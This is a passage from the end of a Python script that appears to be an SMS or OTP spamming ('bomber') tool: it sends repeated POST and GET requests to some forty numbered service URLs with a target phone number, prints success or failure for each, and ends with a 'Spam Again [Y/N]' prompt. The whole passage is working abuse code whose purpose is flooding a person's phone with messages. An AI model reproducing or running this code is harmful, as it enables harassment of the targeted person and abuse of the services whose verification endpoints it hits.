			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp21 = requests.post(url19, headers=headers19, data=data19)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp21 = requests.post(url20, headers=headers20, data=data20)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)

		try:
			tim=time.strftime('  %I:%M ')
			resp21 = requests.get(url21)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp22 = requests.get(url22,headers=headers22)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp23 = requests.post(url23, headers=headers23, data=data23)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			resp24 = requests.post(url24, headers=headers24, data=data24)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp25 = requests.post(url25, headers=headers25, data=data25)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp26 = requests.post(url26, headers=headers26, data=data26)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp27 = requests.get(url27)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp30 = requests.get(url28,headers=headers28, data=data28)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp31 = requests.get(url29,headers=headers29, data=data29)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp32 = requests.post(url30,headers=headers30, data=data30)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp33 = requests.get(url31,headers=headers31, data=data31)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp34 = requests.post(url32,data=data32)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp38 = requests.post(url33,headers=headers33, data=data33)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			requests.get(url34+number)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp39 = requests.post(url35, headers=headers35, data=data35)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp39 = requests.post(url36, headers=headers36, data=data36)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp40 = requests.post(url37,data37)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp41 = requests.post(url38, headers=headers38, data=data38)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp41 = requests.post(url39, headers=headers39, data=data39)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp41 = requests.post(url40, headers=headers40, data=data40)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)

	else:
		print(' ')
		sty4('\033[1;36m\t<\033[1;37m/\033[1;36m>    \033[1;36mProcess Finished !!')
		print(' ')
		
		darkxf=input("\033[1;36m<\033[1;37m/\033[1;36m>    \033[1;32mSpam Again [Y/N]\033[1;33m     âž¤    \033[1;37m")
		if darkxf in ['y','Y']:
			time.sleep(2)
			_darkx_()
			
		else:
			time.sleep(2)
			os.system('exit')
	
	
	
	
	
status()
